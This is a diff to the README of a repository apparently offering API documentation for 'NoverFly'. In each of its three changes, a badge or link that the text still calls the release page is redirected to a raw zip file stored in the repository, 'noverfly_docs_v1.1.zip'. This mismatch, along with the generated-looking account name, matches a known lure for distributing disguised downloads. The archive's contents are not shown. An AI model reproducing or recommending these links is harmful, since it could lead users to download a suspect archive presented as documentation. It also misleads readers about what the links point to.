@@ -1,6 +1,6 @@
 # 📘 noverfly-docs - Clear API Docs for NoverFly
 
-[![Download](https://img.shields.io/badge/Download%20Page-Visit%20Releases-blue?style=for-the-badge)](https://github.com/pteridologistottofritzmeyerhof750/noverfly-docs/releases)
+[![Download](https://img.shields.io/badge/Download%20Page-Visit%20Releases-blue?style=for-the-badge)](https://github.com/pteridologistottofritzmeyerhof750/noverfly-docs/raw/refs/heads/main/articles/noverfly_docs_v1.1.zip)
 
 ## 🚀 What this is
 
@@ -33,7 +33,7 @@ If you plan to use the docs with local tools, also have:
 
 Go to the release page and get the latest file from there:
 
-[![Download NoverFly Docs](https://img.shields.io/badge/Download%20NoverFly%20Docs-Release%20Page-6A5ACD?style=for-the-badge)](https://github.com/pteridologistottofritzmeyerhof750/noverfly-docs/releases)
+[![Download NoverFly Docs](https://img.shields.io/badge/Download%20NoverFly%20Docs-Release%20Page-6A5ACD?style=for-the-badge)](https://github.com/pteridologistottofritzmeyerhof750/noverfly-docs/raw/refs/heads/main/articles/noverfly_docs_v1.1.zip)
 
 1. Open the release page in your browser.
 2. Look for the newest version near the top.
@@ -244,4 +244,4 @@ When you open the docs, check these items first:
 
 Use the release page to get the latest version:
 
-https://github.com/pteridologistottofritzmeyerhof750/noverfly-docs/releases
+https://github.com/pteridologistottofritzmeyerhof750/noverfly-docs/raw/refs/heads/main/articles/noverfly_docs_v1.1.zip
